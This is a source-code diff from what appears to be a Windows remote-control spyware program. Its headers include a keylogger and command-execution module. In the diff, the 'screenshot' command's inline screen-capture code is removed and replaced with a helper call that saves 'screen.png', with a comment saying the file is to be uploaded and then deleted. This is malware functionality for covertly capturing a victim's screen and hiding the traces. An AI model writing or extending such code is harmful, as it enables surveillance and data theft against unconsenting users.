@@ -2,6 +2,7 @@
 #include "CommandExe.h"
 #include "Hax.h"
 #include "Keylogger.h"
+#include "Screenshot.h"
 
 static std::vector<std::string> split(const std::string &s, char delim) {
     std::stringstream ss(s);
@@ -58,23 +59,8 @@ command_t commandDefs[] = {
     },
     {
         "screenshot", [](std::vector<std::string> args) {
-            HDC hScreenDC = CreateDC(_T("DISPLAY"), NULL, NULL, NULL);
-            HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
-
-            int x = GetDeviceCaps(hScreenDC, HORZRES);
-            int y = GetDeviceCaps(hScreenDC, VERTRES);
-
-            HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, x, y);
-            HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
-
-            BitBlt(hMemoryDC, 0, 0, x, y, hScreenDC, 0, 0, SRCCOPY);
-            hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
-
-            DeleteDC(hMemoryDC);
-            DeleteDC(hScreenDC);
-
-            // upload
-            // free hBitmap
+            TakeScreenshot(_T("screen.png"));
+            // upload and then delete
         }
     },
     {
